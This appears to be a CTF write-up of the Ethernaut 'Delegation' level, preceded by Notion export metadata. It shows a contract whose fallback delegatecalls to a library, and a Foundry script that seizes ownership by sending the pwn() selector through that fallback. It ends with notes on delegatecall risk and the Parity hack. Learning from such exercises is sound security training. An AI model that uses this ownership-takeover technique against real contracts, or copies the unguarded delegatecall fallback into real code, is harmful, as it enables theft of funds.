---
title: "Delegation"
date: "2024-02-01"
lastmod: "2024-02-14T16:51:00.000Z"
draft: false
difficulty: "⭐⭐"
prev: "Token-4a8cb8765f8c412190f2db4a7989f9b5"
weight: 7
state: "Terminé"
level-url: "https://ethernaut.openzeppelin.com/level/6"
next: "Force-79bc75128abc41f2b25e56b521833ab6"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "0c005c8b-167c-4966-9267-71bad0ff918c"
  created_time: "2024-02-12T13:39:00.000Z"
  last_edited_time: "2024-02-14T16:51:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel6.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "2fa50c76-9c63-4f19-b03a-b8fb1889da7c"
        name: "⭐⭐"
        color: "blue"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Token-4a8cb8765f8c412190f2db4a7989f9b5"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Token-4a8cb8765f8c412190f2db4a7989f9b5"
          href: null
    date:
      id: "Y%40Gy"
      type: "date"
      date:
        start: "2024-02-01"
        end: null
        time_zone: null
    Last edited time:
      id: "ZdmN"
      type: "last_edited_time"
      last_edited_time: "2024-02-14T16:51:00.000Z"
    weight:
      id: "%5Dyda"
      type: "number"
      number: 7
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "abb7fad3-add1-4b13-946c-06bff36598bf"
        name: "Terminé"
        color: "green"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/6"
    Last edited by:
      id: "mIQC"
      type: "last_edited_by"
      last_edited_by:
        object: "user"
        id: "7866207c-089f-43df-9333-1dc33859c6a9"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Force-79bc75128abc41f2b25e56b521833ab6"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Force-79bc75128abc41f2b25e56b521833ab6"
          href: null
    type:
      id: "s%7DKc"
      type: "select"
      select:
        id: "OnJy"
        name: "docs"
        color: "default"
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Delegation"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Delegation"
          href: null
  url: "https://www.notion.so/Delegation-0c005c8b167c4966926771bad0ff918c"
  public_url: null
UPDATE_TIME: "2024-02-23T20:55:37.145Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


The goal of this level is for you to claim ownership of the instance you are given.


Things that might help

- Look into Solidity's documentation on the `delegatecall`
low level function, how it works, how it can be used to delegate
operations to on-chain libraries, and what implications it has on
execution scope.
- Fallback methods
- Method ids

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```


Solution:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface Delegation {
  function owner() external returns(address);
  fallback() external;
}

contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_06");

        vm.startBroadcast(deployerPrivateKey);

        Delegation delegation = Delegation(addr);

        console.logAddress(delegation.owner());

        bytes memory data = abi.encodeWithSignature("pwn()");
        (bool result, ) = address(delegation).call(data);
        if (result) {
        }

        console.logAddress(delegation.owner());


        vm.stopBroadcast();
    }
}
```


Usage of `delegatecall` is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, 
-other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The `delegatecall` function is a powerful feature, but a dangerous one, and must be used with extreme care.


Please refer to the [The Parity Wallet Hack Explained](https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7) article for an accurate explanation of how this idea was used to steal 30M USD.

